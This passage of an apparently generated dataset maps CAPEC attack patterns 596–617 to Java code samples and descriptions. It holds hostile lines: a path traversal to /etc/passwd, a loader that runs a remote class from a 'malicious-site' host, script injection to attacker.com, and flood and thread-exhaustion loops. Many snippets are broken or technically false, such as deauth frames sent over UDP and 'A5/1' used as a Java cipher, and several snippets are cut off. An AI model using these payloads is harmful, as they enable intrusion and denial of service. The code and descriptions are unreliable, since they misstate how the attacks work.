        "code_snippet": "import java.net.Socket;\nimport java.net.URL;\nimport java.net.HttpURLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class TCP_RST_Injection {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"target_host\", 80);\n        String getReq = \"GET / HTTP/1.1\\r\\nHost: target_host\\r\\n\\r\\n\";\n        socket.getOutputStream().write(getReq.getBytes());\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // CWE-918: Server-Side Request Forgery (SSRF)\n        URL url = new URL(\"http://attacker_host/malicious_url\");\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"GET\");\n        conn.connect();\n\n        // CWE-294: Authentication Bypass by Capture-replay\n        String replayReq = \"GET / HTTP/1.1\\r\\nHost: target_host\\r\\n\\r\\n\";\n        socket.getOutputStream().write(replayReq.getBytes());\n\n        // CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n        // CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')\n        String maliciousReq = \"GET / HTTP/1.1\\r\\nHost: target_host\\r\\nX-Forwarded-For: attacker_ip\\r\\n\\r\\n\";\n        socket.getOutputStream().write(maliciousReq.getBytes());\n\n        // Send TCP RST packet\n        socket.close();\n    }\n}",
        "description": "Java code snippet demonstrating TCP RST packet injection attack, exploiting CWE-940, CWE-918, CWE-294, CWE-444, and CWE-113 vulnerabilities. The code sends a GET request, followed by a malicious request with a spoofed IP address, and finally closes the socket to send a TCP RST packet, terminating the connection."
    },
    {
        "capec_id": "597",
        "code_snippet": "public class FileAccessor {\n    public void accessFile(String filePath) {\n        try {\n            File file = new File(filePath);\n            if (file.exists()) {\n                System.out.println(\"File found: \" + file.getAbsolutePath());\n                // Perform operations on the file\n            } else {\n                System.out.println(\"File not found: \" + filePath);\n            }\n        } catch (Exception e) {\n            System.out.println(\"Error accessing file: \" + e.getMessage());\n        }\n    }\n\n    public static void main(String[] args) {\n        FileAccessor accessor = new FileAccessor();\n        accessor.accessFile(\"../../../../etc/passwd\");\n    }\n}",
        "description": "This Java code snippet demonstrates the vulnerability of path traversal. The 'accessFile' method takes a file path as input and attempts to access the file. The method does not properly validate the input path, allowing an attacker to traverse the file system by providing a path with '../' or absolute path sequences. In the 'main' method, an example of exploiting this vulnerability is shown by accessing the '/etc/passwd' file, which is typically restricted."
    },
    {
        "capec_id": "598",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.io.IOException;\nimport java.net.URL;\nimport java.net.HttpURLConnection;\n\npublic class DNSPoisoning {\n    public static void main(String[] args) throws UnknownHostException, IOException {\n        // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n        InetAddress addr = InetAddress.getByName(\\",
        "description": "This Java code snippet demonstrates a DNS poisoning attack, where an attacker-controlled DNS server responds to a reverse DNS resolution request with a malicious hostname. The code then uses this hostname to download and execute malicious code, redirect to a phishing page, and perform a server-side request forgery (SSRF) attack. The code embodies the main idea of the CAPEC and incorporates the related CWEs for additional context."
    },
    {
        "capec_id": "599",
        "code_snippet": "import java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.Socket;\n\npublic class SatelliteCommunication {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"satellite.example.com\", 8080);\n        DataOutputStream dout = new DataOutputStream(socket.getOutputStream());\n        DataInputStream din = new DataInputStream(socket.getInputStream());\n\n        // CWE-319: Cleartext transmission of sensitive information\n        String sensitiveData = \"TopSecretMessage\";\n        dout.writeUTF(sensitiveData);\n\n        // CWE-923: Improper restriction of communication channel to intended endpoints\n        String endpoint = \"attacker.example.com\";\n        dout.writeUTF(endpoint);\n\n        // CWE-924: Improper enforcement of message integrity during transmission\n        String message = din.readUTF();\n        System.out.println(\"Received message: \" + message);\n\n        // CWE-927: Use of implicit intent for sensitive communication (Android-specific, not applicable in this Java example)\n\n        // CWE-1316: Fabric-address map allows programming of unwarranted overlaps of protected and unprotected ranges (hardware-specific, not applicable in this Java example)\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC attack pattern of transmitting disruptive signals to a satellite dish, exploiting vulnerabilities in satellite communication. The code establishes a socket connection to a satellite endpoint and transmits sensitive data in cleartext, violating CWE-319. It also fails to properly restrict the communication channel to the intended endpoint, as per CWE-923. Furthermore, the code does not ensure the integrity of the received message, making it vulnerable to CWE-924. Note that CWE-927 and CWE-1316 are not applicable in this Java example, as they are specific to Android and hardware contexts, respectively."
    },
    {
        "capec_id": "600",
        "code_snippet": "public class CredentialStuffingExample {\n    private static final String[][] KNOWN_CREDENTIALS = {\n        {\\",
        "description": "This Java code snippet demonstrates a credential stuffing attack, where an adversary tries known username/password combinations against a system. The code uses a simple authentication mechanism that stores credentials in plaintext, making it vulnerable to CWE-522. The code also lacks protection against brute force attacks, CWE-307, and relies on single-factor authentication, CWE-308. Additionally, the code does not implement password aging, CWE-262, and uses a long expiration period, CWE-263. The code's reliance on a single factor in a security decision, CWE-654, further increases its vulnerability to credential stuffing attacks."
    },
    {
        "capec_id": "601",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class VulnerableRadioCommunication {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket(12345);\n        byte[] buffer = new byte[1024];\n\n        // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n        // No validation of the sender's IP address\n        while (true) {\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n            socket.receive(packet);\n\n            // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n            // No message integrity check\n            String message = new String(packet.getData(), 0, packet.getLength());\n            System.out.println(\"Received message: \" + message);\n\n            // CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n            // No rate limiting on responses\n            for (int i = 0; i < 100; i++) {\n                socket.send(new DatagramPacket(message.getBytes(), message.getBytes().length, packet.getAddress(), packet.getPort()));\n            }\n\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            // Sensitive information sent in plaintext\n            String sensitiveData = \"password=secret\";\n            socket.send(new DatagramPacket(sensitiveData.getBytes(), sensitiveData.getBytes().length, packet.getAddress(), packet.getPort()));\n\n            // CWE-421: Race Condition During Access to Alternate Channel\n            // No synchronization on the socket\n            new Thread(() -> {\n                try {\n                    socket.send(new DatagramPacket(\"Racing condition!\".getBytes(), \"Racing condition!\".getBytes().length, packet.getAddress(), packet.getPort()));\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }).start();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable radio communication system that is susceptible to disruption by an adversary using radio noise or signals. The code lacks proper message integrity checks, allows unlimited network message volume, transmits sensitive information in plaintext, and has a race condition during access to an alternate channel. An attacker can exploit these weaknesses to disrupt the communication channel and deny service to legitimate users."
    },
    {
        "capec_id": "602",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            InetAddress address = InetAddress.getByName(\"example.com\");\n            String hostName = address.getHostName();\n            // Using deprecated function InetAddress.getHostName()\n            System.out.println(\"Hostname: \" + hostName);\n            // Using dynamic class loading\n            Class<?> clazz = Class.forName(\"java.lang.System\");\n            Object obj = clazz.newInstance();\n            // Reliance on DNS lookups in a security decision\n            if (hostName.equals(\"example.com\")) {\n                // Authentication bypass issue\n                System.out.println(\"Authenticated!\");\n            } else {\n                System.out.println(\"Authentication failed!\");\n            }\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host exception: \" + e.getMessage());\n        } catch (ClassNotFoundException e) {\n            System.out.println(\"Class not found exception: \" + e.getMessage());\n        } catch (InstantiationException e) {\n            System.out.println(\"Instantiation exception: \" + e.getMessage());\n        } catch (IllegalAccessException e) {\n            System.out.println(\"Illegal access exception: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a deprecated attack pattern that incorporates multiple weaknesses. It uses the deprecated InetAddress.getHostName() function, relies on DNS lookups for security decisions, and has potential authentication bypass issues. Additionally, it employs dynamic class loading, which can be a sign of obsolete code. The code has not been actively reviewed or maintained, making it vulnerable to various attacks."
    },
    {
        "capec_id": "603",
        "code_snippet": "public class ResourceExhaustion {\n    public static void main(String[] args) {\n        ExecutorService executor = Executors.newCachedThreadPool();\n        while (true) {\n            executor.execute(new Runnable() {\n                public void run() {\n                    try {\n                        Thread.sleep(Long.MAX_VALUE);\n                    } catch (InterruptedException e) {\n                    }\n                }\n            });\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of blocking the delivery of an important system resource, causing the system to fail or stop working. It creates an unbounded number of threads, exhausting the system's thread pool and eventually leading to a denial-of-service. This code embodies CWEs 693 (Protection Mechanism Failure), 770 (Allocation of Resources Without Limits or Throttling), 1229 (Creation of Emergent Resource), 400 (Uncontrolled Resource Consumption), and 1334 (Unauthorized Error Injection Can Degrade Hardware Redundancy)."
    },
    {
        "capec_id": "604",
        "code_snippet": "import java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\n\npublic class WiFijammer {\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            InetAddress address = InetAddress.getByName(\"<target_wifi_ip>\");\n            byte[] deauthPacket = new byte[] { (byte) 0xC0, (byte) 0x00, (byte) 0x3A, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF };\n            while (true) {\n                socket.send(new DatagramPacket(deauthPacket, deauthPacket.length, address, 8080));\n            }\n        } catch (SocketException e) {\n            System.out.println(\"Error creating socket: \" + e.getMessage());\n        } catch (UnknownHostException e) {\n            System.out.println(\"Error resolving target WiFi IP: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a Wi-Fi jammer that sends deauthentication frames to a target Wi-Fi network, preventing users from transmitting or receiving data. The code establishes a communication channel with the target Wi-Fi network without properly verifying the source of the communication channel (CWE-940) and does not ensure the integrity of the transmitted message (CWE-924). It also does not restrict the communication channel to the intended endpoint (CWE-923) and transmits sensitive information in cleartext (CWE-319). Additionally, the code is vulnerable to a race condition during access to an alternate channel (CWE-421)."
    },
    {
        "capec_id": "605",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class CellularDisruptor {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress cellTowerAddress = InetAddress.getByName(\"celltower.example.com\");\n        byte[] falseStatusMessage = \"OVERWHELMING FALSE STATUS MESSAGE\".getBytes();\n        DatagramPacket packet = new DatagramPacket(falseStatusMessage, falseStatusMessage.length, cellTowerAddress, 12345);\n        while (true) {\n            socket.send(packet);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a cellular disruptor attack, where an attacker sends overwhelming false status messages to a cell tower, disrupting communication between the cell tower and user devices. The code uses a DatagramSocket to send UDP packets to the cell tower, without verifying the integrity of the communication channel or the source of the packets, making it vulnerable to CWE-924, CWE-1300, CWE-300, CWE-940, and CWE-319."
    },
    {
        "capec_id": "606",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.SecureRandom;\n\npublic class InsecureEncryption {\n    public static void main(String[] args) throws Exception {\n        // CWE-321: Hard-coded cryptographic key\n        byte[] hardCodedKey = \"my_secret_key\".getBytes();\n        SecretKey key = new SecretKeySpec(hardCodedKey, \"AES\");\n\n        // CWE-327: Use of a broken or risky cryptographic algorithm\n        Cipher cipher = Cipher.getInstance(\"AES/ECB/NoPadding\", \"SunJCE\");\n        cipher.init(Cipher.ENCRYPT_MODE, key);\n\n        // CWE-326: Inadequate encryption strength\n        String plaintext = \"confidential_data\";\n        byte[] encryptedData = cipher.doFinal(plaintext.getBytes());\n\n        // CWE-924: Improper enforcement of message integrity during transmission\n        // No message authentication code (MAC) or digital signature is used\n        // to ensure the integrity of the encrypted data during transmission\n\n        // CWE-757: Selection of less-secure algorithm during negotiation\n        // No secure algorithm negotiation is performed, and the weakest\n        // algorithm (A5/0, A5/1, or A5/2) is used\n        // In a real-world scenario, this would be done through a protocol\n        // or implementation that allows negotiation of the encryption algorithm\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of forcing a mobile device to use no encryption or weak encryption. It includes CWEs such as hard-coded cryptographic key, use of a broken or risky cryptographic algorithm, inadequate encryption strength, improper enforcement of message integrity during transmission, and selection of less-secure algorithm during negotiation."
    },
    {
        "capec_id": "607",
        "code_snippet": "public class SystemComponent {\n    private boolean isRedundant;\n    private boolean isCompartmentalized;\n    \n    public SystemComponent(boolean isRedundant, boolean isCompartmentalized) {\n        this.isRedundant = isRedundant;\n        this.isCompartmentalized = isCompartmentalized;\n    }\n    \n    public void interactWithOtherComponent() {\n        if (!isCompartmentalized) {\n            // Improper isolation or compartmentalization (CWE-653)\n            try {\n                // Simulate an unauthorized error injection (CWE-1334)\n                throw new RuntimeException(\"Injected error\");\n            } catch (RuntimeException e) {\n                // Protection mechanism failure (CWE-693)\n                System.out.println(\"Error occurred: \" + e.getMessage());\n            }\n        }\n        \n        if (isRedundant) {\n            // Simulate hardware logic with race conditions (CWE-1298)\n            boolean[] flags = new boolean[2];\n            flags[0] = true;\n            flags[1] = false;\n            if (flags[0] && !flags[1]) {\n                // Improper handling of faults that lead to instruction skips (CWE-1332)\n                System.out.println(\"Redundancy compromised\");\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of obstructing interactions between system components. It includes CWE-653 (Improper Isolation or Compartmentalization), CWE-1334 (Unauthorized Error Injection Can Degrade Hardware Redundancy), CWE-693 (Protection Mechanism Failure), CWE-1332 (Improper Handling of Faults that Lead to Instruction Skips), and CWE-1298 (Hardware Logic Contains Race Conditions). The code shows how an attacker can exploit these weaknesses to disrupt system component interactions, leading to a degraded system state."
    },
    {
        "capec_id": "608",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.SecureRandom;\n\npublic class VulnerableCellularEncryption {\n    public static void main(String[] args) throws Exception {\n        // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n        KeyGenerator kgen = KeyGenerator.getInstance(\"A5/1\");\n        kgen.init(64); // CWE-326: Inadequate Encryption Strength\n        SecretKey skey = kgen.generateKey();\n\n        // CWE-321: Use of Hard-coded Cryptographic Key\n        byte[] hardCodedKey = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08};\n        Cipher cipher = Cipher.getInstance(\"A5/1\");\n        cipher.init(Cipher.ENCRYPT_MODE, new javax.crypto.spec.SecretKeySpec(hardCodedKey, \"A5/1\"));\n\n        // CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\n        String[] algorithms = {\"A5/1\", \"A5/2\"};\n        for (String algorithm : algorithms) {\n            cipher = Cipher.getInstance(algorithm);\n            // CWE-1300: Improper Protection of Physical Side Channels\n            // No protection mechanisms to prevent physical side channels\n            cipher.doFinal(\"Sensitive data to be encrypted\".getBytes());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the use of broken or risky cryptographic algorithms, inadequate encryption strength, hard-coded cryptographic keys, and selection of less-secure algorithms during negotiation, making it vulnerable to cryptanalytic attacks and cellular encryption defeat."
    },
    {
        "capec_id": "609",
        "code_snippet": "import java.io.DataOutputStream;\nimport java.net.Socket;\n\npublic class CellularTrafficInterceptor {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"attacker-cell-tower.com\", 8080);\n        DataOutputStream dos = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-311: Missing Encryption of Sensitive Data\n        String sensitiveData = \"username=password\";\n        dos.writeUTF(sensitiveData);\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        String incomingRequest = dos.readUTF();\n        // No verification of the source of the communication channel\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        String receivedMessage = dos.readUTF();\n        // No check for message integrity during transmission\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        dos.writeUTF(\"creditCardNumber=1234-5678-9012-3456\");\n\n        // CWE-927: Use of Implicit Intent for Sensitive Communication (Android-specific, not applicable in this Java code)\n    }\n}",
        "description": "This Java code snippet demonstrates a cellular traffic interceptor that embodies the main idea of the CAPEC. It establishes a communication channel with a malicious cellular tower equipment and transmits sensitive data in cleartext without encryption or verification of the source of the communication channel. The code also fails to ensure message integrity during transmission, making it vulnerable to interception and modification."
    },
    {
        "capec_id": "610",
        "code_snippet": "import java.net.*;\nimport java.io.*;\nimport java.util.*;\n\npublic class VulnerableCode {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"example.com\", 8080);\n        DataOutputStream dout = new DataOutputStream(socket.getOutputStream());\n        DataInputStream din = new DataInputStream(socket.getInputStream());\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        String sensitiveInfo = \"username:password\";\n        dout.writeUTF(sensitiveInfo);\n\n        // CWE-201: Insertion of Sensitive Information Into Sent Data\n        String dataToSend = \"Hello, my credit card number is 1234-5678-9012-3456\";\n        dout.writeUTF(dataToSend);\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        byte[] receivedData = new byte[1024];\n        int bytesRead = din.read(receivedData);\n        String receivedMessage = new String(receivedData, 0, bytesRead);\n        System.out.println(\"Received message: \" + receivedMessage);\n\n        // CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n        for (int i = 0; i < 1000; i++) {\n            dout.writeUTF(\"Flooding the network...\");\n        }\n\n        // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n        // Assume a method to activate test/debug logic is available\n        activateTestLogic();\n    }\n\n    // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n    public static void activateTestLogic() {\n        // Code to activate test/debug logic\n        System.out.println(\"Test/debug logic activated...\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of injecting data into mobile technology traffic to disrupt communications or conduct additional surveillance operations. It includes vulnerabilities related to CWE-319 (cleartext transmission of sensitive information), CWE-201 (insertion of sensitive information into sent data), CWE-924 (improper enforcement of message integrity during transmission), CWE-406 (insufficient control of network message volume), and CWE-1313 (hardware allows activation of test or debug logic at runtime)."
    },
    {
        "capec_id": "611",
        "code_snippet": "import java.io.IOException;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\n\npublic class BitSquattingAttack {\n    public static void main(String[] args) throws IOException, InterruptedException, URISyntaxException {\n        String originalDomain = \"https://example.com\";\n        String squattingDomain = \"https://examp1e.com\";\n        String redirectUrl = \"https://attacker.com\";\n\n        // CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(new URI(originalDomain))\n                .GET()\n                .build();\n\n        HttpClient client = HttpClient.newHttpClient();\n        HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());\n\n        // CWE-84: Improper Neutralization of Encoded URI Schemes in a Web Page\n        String encodedRedirectUrl = redirectUrl.replace(\"https\", \"hxxps\");\n        response = client.send(HttpRequest.newBuilder()\n                .uri(new URI(encodedRedirectUrl))\n                .GET()\n                .build(), HttpResponse.BodyHandlers.ofString());\n\n        // CWE-494: Download of Code Without Integrity Check\n        String maliciousCode = \"<script src='\" + redirectUrl + \"'/><script>\";\n        response = client.send(HttpRequest.newBuilder()\n                .uri(new URI(squattingDomain))\n                .header(\"Content-Type\", \"text/html\")\n                .POST(HttpRequest.BodyPublishers.ofString(maliciousCode))\n                .build(), HttpResponse.BodyHandlers.ofString());\n\n        // CWE-294: Authentication Bypass by Capture-replay\n        String capturedToken = \"captured_token\";\n        response = client.send(HttpRequest.newBuilder()\n                .uri(new URI(squattingDomain + \"/login\"))\n                .header(\"Authorization\", \"Bearer \" + capturedToken)\n                .GET()\n                .build(), HttpResponse.BodyHandlers.ofString());\n\n        // CWE-598: Use of GET Request Method With Sensitive Query Strings\n        response = client.send(HttpRequest.newBuilder()\n                .uri(new URI(squattingDomain + \"/login?username=user&password=pass\"))\n                .GET()\n                .build(), HttpResponse.BodyHandlers.ofString());\n    }\n}\n",
        "description": "This Java code snippet demonstrates a BitSquatting attack, which involves registering a domain name one bit different than a trusted domain. The code includes vulnerabilities related to CWE-601, CWE-84, CWE-494, CWE-294, and CWE-598, making it possible for an adversary to redirect traffic to a malicious entity."
    },
    {
        "capec_id": "612",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.NetworkInterface;\nimport java.net.SocketException;\nimport java.util.Enumeration;\n\npublic class MACAddressTracker {\n    public static void main(String[] args) throws SocketException {\n        DatagramSocket socket = new DatagramSocket();\n        Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();\n        while (interfaces.hasMoreElements()) {\n            NetworkInterface networkInterface = interfaces.nextElement();\n            byte[] macBytes = networkInterface.getHardwareAddress();\n            String macAddress = getMACAddress(macBytes);\n            // Send the MAC address over the network without proper access control\n            socket.send(new DatagramPacket(macAddress.getBytes(), macAddress.getBytes().length, InetAddress.getByName(\\",
        "description": "This Java code snippet demonstrates a vulnerable implementation of a MAC address tracker. It sends the MAC address of the device over the network without proper access control, allowing an attacker to track the device. The code uses the `DatagramSocket` class to send the MAC address to a server, but it does not verify the identity of the server or ensure the integrity of the communication channel, making it vulnerable to CWE-300. Additionally, the code transmits sensitive information (the MAC address) without proper access control, making it vulnerable to CWE-201. The code also opens an alternate channel to communicate with the server, but the channel is accessible to other actors, making it vulnerable to CWE-421."
    },
    {
        "capec_id": "613",
        "code_snippet": "public class WifiTracker {\n    public static void main(String[] args) {\n        WifiManager wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE);\n        String ssid = wifiManager.getConnectionInfo().getSSID();\n        // CWE-201: Insertion of Sensitive Information Into Sent Data\n        sendWifiInfoToServer(ssid);\n    }\n\n    public static void sendWifiInfoToServer(String ssid) {\n        // CWE-300: Channel Accessible by Non-Endpoint\n        Socket socket = new Socket(\"server.com\", 8080);\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        out.println(ssid);\n        // CWE-1290: Incorrect Decoding of Security Identifiers\n        // CWE-1192: Improper Identifier for IP Block used in System-On-Chip (SOC)\n        // CWE-1302: Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC)\n        // No validation or verification of the server's identity or the integrity of the channel\n        // No unique, immutable identifiers for each component\n        // No security identifier mechanism to differentiate allowed actions\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable WiFi tracker that sends the WiFi network's SSID to a server without proper verification of the server's identity or the integrity of the channel, allowing an attacker to track the user's location."
    },
    {
        "capec_id": "614",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.Key;\n\npublic class SIMCardExploit {\n    public static void main(String[] args) throws Exception {\n        // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n        KeyGenerator kgen = KeyGenerator.getInstance(\"DES\");\n        SecretKey skey = kgen.generateKey();\n\n        // CWE-326: Inadequate Encryption Strength\n        Cipher cipher = Cipher.getInstance(\"DES/ECB/NoPadding\");\n        cipher.init(Cipher.ENCRYPT_MODE, skey);\n\n        // CWE-1277: Firmware Not Updateable\n        // Assume the firmware is not updateable, and the vulnerability remains\n        String maliciousCode = \"...\";\n        byte[] encryptedCode = cipher.doFinal(maliciousCode.getBytes());\n\n        // CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n        // Assume the confidential information is accessible\n        String phoneNumber = \"...\";\n        String voicemailNumber = \"...\";\n\n        // CWE-1191: On-Chip Debug and Test Interface With Improper Access Control\n        // Assume the debug interface is accessible\n        sendSMS(phoneNumber, voicemailNumber, encryptedCode);\n    }\n\n    public static void sendSMS(String phoneNumber, String voicemailNumber, byte[] encryptedCode) {\n        // Send the malicious SMS message\n        // ...\n    }\n}",
        "description": "Java code snippet demonstrating the exploitation of a vulnerable SIM card using a broken cryptographic algorithm (DES), inadequate encryption strength, and lack of firmware updates. The code also assumes access to confidential information and an unprotected debug interface."
    },
    {
        "capec_id": "615",
        "code_snippet": "import java.net.Socket;\nimport java.net.ServerSocket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.InetAddress;\n\npublic class RogueWiFiAccessPoint {\n    public static void main(String[] args) throws Exception {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        Socket socket = serverSocket.accept();\n        DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());\n        DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-300: Channel Accessible by Non-Endpoint\n        // No verification of the client's identity\n        String clientData = dataInputStream.readUTF();\n        System.out.println(\"Received from client: \" + clientData);\n\n        // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n        // No restriction on the communication channel\n        dataOutputStream.writeUTF(\"Hello from rogue access point\");\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // No verification of the source of the communication channel\n        InetAddress clientAddress = socket.getInetAddress();\n        System.out.println(\"Client address: \" + clientAddress);\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        // Sensitive data transmitted in cleartext\n        dataOutputStream.writeUTF(\"username:password\");\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        // No enforcement of message integrity during transmission\n        String receivedData = dataInputStream.readUTF();\n        System.out.println(\"Received data: \" + receivedData);\n    }\n}",
        "description": "This Java code snippet demonstrates a rogue Wi-Fi access point that intercepts and captures Wi-Fi data traffic. It lacks proper verification of the client's identity, restriction of the communication channel, and enforcement of message integrity during transmission, making it vulnerable to various attacks."
    },
    {
        "capec_id": "616",
        "code_snippet": "import java.io.File;\nimport java.net.URL;\nimport java.net.URLClassLoader;\n\npublic class MaliciousResource {\n    public static void main(String[] args) throws Exception {\n        // CWE-426: Untrusted Search Path\n        String maliciousPath = \"http://malicious-site.com/malicious-jar\";\n        URLClassLoader loader = new URLClassLoader(new URL[]{new URL(maliciousPath)});\n        Class<?> maliciousClass = loader.loadClass(\"MaliciousClass\");\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        Object maliciousObject = maliciousClass.newInstance();\n        String sensitiveInfo = (String) maliciousClass.getMethod(\"getSensitiveInfo\").invoke(maliciousObject);\n        System.out.println(\"Sensitive Info: \" + sensitiveInfo);\n\n        // CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak')\n        File privateResource = new File(\"private-resource.txt\");\n        URL privateResourceUrl = privateResource.toURI().toURL();\n        loader.addURL(privateResourceUrl);\n\n        // CWE-1229: Creation of Emergent Resource\n        File emergentResource = new File(\"emergent-resource.txt\");\n        emergentResource.createNewFile();\n        System.out.println(\"Emergent Resource Created: \" + emergentResource.getAbsolutePath());\n\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        System.out.println(\"Sensitive Info Leaked: \" + sensitiveInfo);\n    }\n}",
        "description": "This Java code snippet demonstrates a malicious resource that exploits multiple vulnerabilities. It loads a malicious JAR file from an untrusted search path, invokes a method to obtain sensitive information without verifying the source of the communication channel, leaks private resources into a new sphere, creates an emergent resource, and exposes sensitive information to an unauthorized actor."
    },
    {
        "capec_id": "617",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class RogueBaseStation {\n    public static void main(String[] args) throws IOException {\n        ServerSocket rogueBaseStation = new ServerSocket(8080);\n        System.out.println(\"Rogue base station started...\");\n\n        Socket deviceConnection = rogueBaseStation.accept();\n        System.out.println(\"Device connected...\");\n\n        // CWE-940: No verification of the device's identity\n        // CWE-300: No authentication of the device\n        String deviceData = receiveData(deviceConnection);\n        System.out.println(\"Received data from device: \" + deviceData);\n\n        // CWE-924: No message integrity check\n        // CWE-923: No verification of the device's endpoint\n        sendData(deviceConnection, \"Malicious command\");\n    }\n\n    private static String receiveData(Socket socket) throws IOException {\n        // CWE-421: Race condition in accessing the alternate channel\n        return \"Received data\";\n    }\n\n    private static void sendData(Socket socket, String data) throws IOException {\n        // CWE-421: Race condition in accessing the alternate channel\n        System.out.println(\"Sent data to device: \" + data);\n    }\n}",
        "description": "This Java code snippet demonstrates a rogue base station that imitates a legitimate cellular base station. It establishes a communication channel with a targeted cellular device without proper verification of the device's identity or endpoint. The rogue base station receives data from the device without ensuring message integrity and sends malicious commands to the device without proper authentication. This code embodies the main idea of the CAPEC and incorporates the related CWEs."
    },
    {
        "capec_id": "618",
